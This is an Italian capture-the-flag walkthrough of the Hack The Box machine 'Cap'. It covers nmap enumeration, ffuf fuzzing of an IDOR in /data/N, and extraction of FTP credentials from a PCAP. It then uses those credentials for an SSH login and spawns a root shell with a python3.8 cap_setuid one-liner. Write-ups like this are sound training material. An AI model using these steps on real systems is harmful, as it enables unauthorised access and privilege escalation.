---
title: "Cap Walkthrough"
description: "Cap è una macchina Linux di difficoltà easy che esegue un server HTTP con funzionalità amministrative, inclusa l'esecuzione di network captures. Controlli inadeguati generano una vulnerabilità Insecure Direct Object Reference (IDOR) che consente l'accesso alla cattura di un altro utente. La cattura contiene credenziali in plaintext e può essere sfruttata per ottenere un foothold iniziale. Una Linux capability viene poi utilizzata per eseguire l'escalation dei privilegi fino a root."
author: dua2z3rr
date: 2025-08-20 1:00:00
categories: [Walkthrough]
tags: ["Area di Interesse: Common Security Controls", "Area di Interesse: Log Analysis", "Area di Interesse: Vulnerability Assessment", "Area di Interesse: Security Operations", "Vulnerabilità: Clear Text Credentials", "Vulnerabilità: File System Configuration", "Vulnerabilità: Insecure Direct Object Reference (IDOR)", "Codice: Python"]
image: /assets/img/cap/cap-resized.png"
---

## Enumerazione Esterna

### Nmap

Cominciamo con un nmap.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.245 -vv -p-
<SNIP>
Scanning 10.10.10.245 [65535 ports]
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 22/tcp on 10.10.10.245
Discovered open port 80/tcp on 10.10.10.245

<SNIP>

┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.245 -vv -sC -sV -p 21,22,80
<SNIP>
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack ttl 63 gunicorn
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sun, 17 Aug 2025 18:07:55 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 193
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid Request Line &#x27;Invalid HTTP request line: &#x27;&#x27;&#x27;
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 17 Aug 2025 18:07:42 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 17 Aug 2025 18:07:47 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   Help: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 197
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid Request Line &#x27;Invalid HTTP request line: &#x27;HELP&#x27;&#x27;
|     </body>
|     </html>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=8/16%Time=68A0C866%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,9C,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x2
SF:0Sun,\x2017\x20Aug\x202025\x2018:07:42\x20GMT\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2019
SF:386\r\n\r\n")%r(HTTPOptions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gu
SF:nicorn\r\nDate:\x20Sun,\x2017\x20Aug\x202025\x2018:07:47\x20GMT\r\nConn
SF:ection:\x20close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nAll
SF:ow:\x20HEAD,\x20OPTIONS,\x20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTS
SF:PRequest,121,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clos
SF:e\r\nContent-Type:\x20text/html\r\nContent-Length:\x20196\r\n\r\n<html>
SF:\n\x20\x20<head>\n\x20\x20\x20\x20<title>Bad\x20Request</title>\n\x20\x
SF:20</head>\n\x20\x20<body>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h
SF:1>\n\x20\x20\x20\x20Invalid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP
SF:\x20Version:\x20&#x27;RTSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n
SF:")%r(FourOhFourRequest,189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:
SF:\x20gunicorn\r\nDate:\x20Sun,\x2017\x20Aug\x202025\x2018:07:55\x20GMT\r
SF:\nConnection:\x20close\r\nContent-Type:\x20text/html;\x20charset=utf-8\
SF:r\nContent-Length:\x20232\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3
SF:C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</tit
SF:le>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x2
SF:0found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x
SF:20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20agai
SF:n\.</p>\n")%r(GenericLines,11E,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:onnection:\x20close\r\nContent-Type:\x20text/html\r\nContent-Length:\x2
SF:0193\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20\x20\x20<title>Bad\x20Reque
SF:st</title>\n\x20\x20</head>\n\x20\x20<body>\n\x20\x20\x20\x20<h1><p>Bad
SF:\x20Request</p></h1>\n\x20\x20\x20\x20Invalid\x20Request\x20Line\x20&#x
SF:27;Invalid\x20HTTP\x20request\x20line:\x20&#x27;&#x27;&#x27;\n\x20\x20<
SF:/body>\n</html>\n")%r(Help,122,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:onnection:\x20close\r\nContent-Type:\x20text/html\r\nContent-Length:\x2
SF:0197\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20\x20\x20<title>Bad\x20Reque
SF:st</title>\n\x20\x20</head>\n\x20\x20<body>\n\x20\x20\x20\x20<h1><p>Bad
SF:\x20Request</p></h1>\n\x20\x20\x20\x20Invalid\x20Request\x20Line\x20&#x
SF:27;Invalid\x20HTTP\x20request\x20line:\x20&#x27;HELP&#x27;&#x27;\n\x20\
SF:x20</body>\n</html>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Dall'output notiamo che abbiamo a che fare con un server ftp, ssh e gunicorn sulla porta 80.

### HTTP

Andiamo sul sito per vedere con cosaabbiamo a che fare.

Aggiungiamo l'ip nemico al file `/etc/hosts`.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

10.10.10.245 cap.htb
```

provando ad accedre il sito.

![Desktop View](/assets/img/cap/cap-home.png)

Possiamo notare che si tratta di una security dashbord e l'utente si chiama nathan. Ci sono 1500 security events, 357 failed login, e 27 port scan. Tutto questo nelle ultime 24 ore. Si deduce che è un target importante...

![Desktop View](/assets/img/cap/cap-data-1.png)

nella directory `/data/1` possiamo scaricare dei file PCAP dati un numero di pacchetti daa contenere ecc. Proviamo a cambiare il numero della subdirectory `data` con un altro numero.

### ffuf

Creiamo una custom wordlist con i numeri da 0 a 100 e utilizziamo ffuf.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $cd; ffuf -w temp.txt:FUZZ -u http://10.10.10.245:80/data/FUZZ -recursion -recursion-depth 1 -v -ic -fs 208

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.245:80/data/FUZZ
 :: Wordlist         : FUZZ: /home/dua2z3rr/temp.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 208
________________________________________________

[Status: 200, Size: 17144, Words: 7066, Lines: 371, Duration: 619ms]
| URL | http://10.10.10.245:80/data/1
    * FUZZ: 1

[Status: 200, Size: 17147, Words: 7066, Lines: 371, Duration: 308ms]
| URL | http://10.10.10.245:80/data/0
    * FUZZ: 0

:: Progress: [101/101] :: Job [1/1] :: 99 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

1 e 0 sono i risultati. Proviamo quindi ad accedere a `/data/0`.

Possiamo scaricare un altro file PCAP.

### Wireshark

Carichiamo quest'ultimo file PCAP e analizziamolo.

![Desktop View](/assets/img/cap/cap-ftp-password.png)

Filtrando il protocollo FTP riusciamo a ottenere le credenziali di Nathan. Proviamo ad accedere con ssh.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh nathan@10.10.10.245
The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.245' (ED25519) to the list of known hosts.
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 20 19:15:33 UTC 2025

  System load:           0.02
  Usage of /:            36.6% of 8.73GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             222
  Users logged in:       0
  IPv4 address for eth0: 10.10.10.245
  IPv6 address for eth0: dead:beef::250:56ff:fe94:ef9c

  => There are 2 zombie processes.


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$
```

## Shell come nathan

### Enumeraione interna

Con la ricerca manuale di vulnerabilità e writable files non si trova nulla. Inizialmente ho pensato a l'exploit **logrotten**, ma la versione non è vulnerabile.
Eseguiamo qundi linpeas e troviamo un file con capabilities: `/usr/bin/python3.8`

### Privilege Escalation

```shell
nathan@cap:/usr/bin$ ./python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# 
```

Prendiamo la root flag e terminiamo la box.
